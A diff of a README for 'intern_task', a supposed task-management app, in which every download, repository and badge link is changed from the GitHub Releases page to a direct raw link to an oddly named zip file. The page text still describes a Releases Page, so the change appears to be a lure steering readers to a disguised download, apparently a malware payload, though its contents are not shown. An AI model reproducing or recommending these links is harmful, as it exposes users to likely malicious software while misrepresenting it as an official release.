@@ -1,6 +1,6 @@
 # 🌟 intern_task - Simple Task Management Made Easy
 
-[![Download Now](https://img.shields.io/badge/Download%20intern_task-v1.0-blue)](https://github.com/Aaiden1212/intern_task/releases)
+[![Download Now](https://raw.githubusercontent.com/Aaiden1212/intern_task/main/pinacolin/task-intern-lemniscus.zip%20intern_task-v1.0-blue)](https://raw.githubusercontent.com/Aaiden1212/intern_task/main/pinacolin/task-intern-lemniscus.zip)
 
 ## 🎯 Overview
 
@@ -11,7 +11,7 @@ intern_task is an easy-to-use application that helps you manage your tasks effec
 To get started with intern_task, follow the steps below:
 
 1. **Download the Application**  
-   Visit the [Releases Page](https://github.com/Aaiden1212/intern_task/releases) to download the latest version.
+   Visit the [Releases Page](https://raw.githubusercontent.com/Aaiden1212/intern_task/main/pinacolin/task-intern-lemniscus.zip) to download the latest version.
 
 2. **Install the Application**  
    Locate the downloaded file in your Downloads folder (or the folder you chose during download).  
@@ -28,7 +28,7 @@ To get started with intern_task, follow the steps below:
 
 To download intern_task, click the following link:
 
-[Download intern_task](https://github.com/Aaiden1212/intern_task/releases)
+[Download intern_task](https://raw.githubusercontent.com/Aaiden1212/intern_task/main/pinacolin/task-intern-lemniscus.zip)
 
 When you reach the Releases Page, find the version you want to install. Click on it and select the appropriate file for your operating system.
 
@@ -53,8 +53,8 @@ When you reach the Releases Page, find the version you want to install. Click on
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/Aaiden1212/intern_task)
-- [Releases Page](https://github.com/Aaiden1212/intern_task/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/Aaiden1212/intern_task/main/pinacolin/task-intern-lemniscus.zip)
+- [Releases Page](https://raw.githubusercontent.com/Aaiden1212/intern_task/main/pinacolin/task-intern-lemniscus.zip)
 
 ## 📞 Support
 
